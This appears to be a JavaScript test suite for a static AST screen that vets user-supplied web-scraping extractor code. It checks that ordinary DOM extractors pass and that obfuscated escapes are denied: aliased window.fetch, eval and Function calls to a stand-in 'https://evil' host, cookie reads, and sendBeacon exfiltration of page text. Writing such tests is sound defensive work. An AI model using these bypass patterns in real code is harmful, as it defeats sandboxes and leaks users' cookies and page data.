// The AST screen exists specifically to catch what the text-based screen
// structurally cannot: a dangerous global renamed through a local variable.
// Every assertion here pairs an obfuscation with the plain form it is
// equivalent to, so a regression reads as "the alias stopped being treated
// the same as the real thing."
const B = new URL('../src/', import.meta.url).href;
const { screenExtractorSourceAst } = await import(B + 'lib/extractor-ast-screen.js');

export default function run(t) {
  const ok = (src) => screenExtractorSourceAst(src).ok === true;
  const denied = (src) => screenExtractorSourceAst(src).ok === false;
  const why = (src) => screenExtractorSourceAst(src).reason || '';

  // ── legitimate extractors must pass (same corpus as the text screen) ──
  t('simple querySelectorAll extractor passes', ok(`
    var out = [];
    document.querySelectorAll('.job').forEach(function (el) {
      out.push({ Title: el.querySelector('h3').innerText, URL: el.querySelector('a').href });
    });
    return out;
  `));
  t('empty-result extractor passes', ok('return [];'));
  t('Array.from + map passes', ok('return Array.from(document.querySelectorAll("li")).map(function(l){return {T:l.innerText};});'));
  t('JSON.parse of embedded page data passes', ok('return JSON.parse(document.getElementById("data").textContent).jobs;'));
  t('try/catch inside an extractor passes', ok('try { return [{T:document.title}]; } catch (e) { return []; }'));
  t('window.getComputedStyle passes (legitimate window use)', ok('var s = window.getComputedStyle(document.body); return [{T: s.display}];'));
  // Data fields that happen to share a name with a tracked identity object
  // must not falsely trip the screen — "parent"/"self"/"top" are plausible
  // column names (org-chart/hierarchy scrapers).
  t('data fields named parent/self/top pass', ok('return [{parent: row.parent, self: row.self, top: row.top}];'));
  t('object literal key "fetch" is not a reference', ok('return [{fetch: "some value"}];'));
  t('property named fetch on an unrelated object passes', ok('var o = {fetch: 1}; return [{T: o.fetch}];'));

  // ── the whole point: aliasing must not defeat the screen ──
  t('var alias of window, dot-access fetch', denied('var w = window; w.fetch("https://evil"); return [];'));
  t('var alias of window, literal-bracket fetch', denied('var w = window; w["fetch"]("https://evil"); return [];'));
  t('var alias of self, dot-access eval', denied('var s = self; s.eval("1"); return [];'));
  t('multi-hop alias chain reaches fetch', denied('var a=window; var b=a; var c=b.fetch; c("https://evil"); return [];'));
  t('global-yielding chain (w.top) still resolves', denied('var w=window; var t=w.top; t.fetch("https://evil"); return [];'));
  t('reassignment (not just declaration) aliases too', denied('var w; w = window; w.fetch("x"); return [];'));
  t('IIFE parameter binding aliases the argument', denied('(function(w){ w.fetch("https://evil"); })(window); return [];'));
  t('enumeration through a var alias', denied('var w = window; Object.values(w); return [];'));
  t('enumeration through a parameter alias', denied('(function(w){ return Object.values(w); })(window); return [];'));
  t('destructuring with rename aliases the local name', denied('var {fetch: f} = window; f("https://evil"); return [];'));
  t('destructuring cookie out of document is the read itself', denied('var {cookie} = document; return [{T: cookie}];'));
  t('destructuring a global-yielding prop chains further access', denied('var {top: t} = window; t.fetch("https://evil"); return [];'));
  t('arrow-function IIFE parameter binding aliases too', denied('((w) => { w.fetch("https://evil"); })(window); return [];'));
  t('cookie reached through a two-hop window->document alias', denied('var w=window; var d=w.document; return [{T: d.cookie}];'));
  t('ordinary destructuring of an unrelated object passes', ok('var {a,b} = row; return [{T:a,U:b}];'));
  t('array destructuring against a literal array aliases positionally', denied('var [w] = [window]; w.fetch("https://evil"); return [];'));
  t('ordinary array destructuring passes', ok('var [a,b] = [1,2]; return [{T:a,U:b}];'));

  // ── same bypasses the text screen closes, verified independently here ──
  t('bare Function() (no new)', denied('var f = Function("return fetch"); f()("x"); return [];'));
  t('constructor-chain Function escape', denied('var f=(function(){}).constructor("return fetch")(); return [];'));
  t('bare this reaches the global object', denied('return [{T: this.document.title}];'));
  t('this via IIFE', denied('var g = (function(){ return this; })(); return [{T: g.fetch ? "y" : "n"}];'));
  t('window.eval (dotted eval)', denied('window.eval("1"); return [];'));
  t('Reflect.get global retrieval', denied('var f = Reflect.get(globalThis, "fetch"); return [];'));
  t('getOwnPropertyDescriptor global retrieval', denied('var f = Object.getOwnPropertyDescriptor(globalThis, "fetch").value; return [];'));
  t('dynamic computed access on window', denied('var k = "fe" + "tch"; window[k]("x"); return [];'));

  // ── other capabilities, reached only via an alias (would slip a naive re-check) ──
  t('document.cookie via a tracked window alias', denied('var w=window; return [{T: w.document.cookie}];'));
  t('window.open via an alias', denied('var w=window; w.open("https://evil"); return [];'));
  // ── document.defaultView is window — the audit's highest-severity bypass ──
  t('document.defaultView.eval denied', denied('var e = document.defaultView.eval; e("1"); return [];'));
  t('document.defaultView.fetch denied', denied('var f = document.defaultView.fetch; f("https://evil"); return [];'));
  t('document alias .defaultView.eval denied', denied('var d = document; var e = d.defaultView.eval; e("1"); return [];'));
  // ── navigator/history aliases (sendBeacon / back were dot-literal-only) ──
  t('navigator alias sendBeacon denied', denied('var n = navigator; n.sendBeacon("https://evil", document.body.innerText); return [];'));
  t('history alias back denied', denied('var h = history; h.back(); return [];'));
  t('history alias replaceState denied', denied('var h = history; h.replaceState({}, "", "/x"); return [];'));
  // ── DOM-insertion exfiltration via alias ──
  t('createElement via alias denied', denied('var c = document.createElement; var s = c("img"); s.src="https://evil"; return [];'));
  t('appendChild via alias denied', denied('var a = document.body.appendChild; a(x); return [];'));
  // ── degenerate/parse-failure input must fail closed, never throw ──
  t('syntax error is rejected, not thrown', denied('return [{{{ not valid js'));
  t('syntax error reason mentions JavaScript', /JavaScript/i.test(why('function (( {')));
  t('empty source is a no-op pass here (the text screen already rejects it)', ok(''));
  t('screen never throws on garbage input', (() => {
    try { screenExtractorSourceAst(Symbol('x')); return true; } catch { return false; }
  })());
}
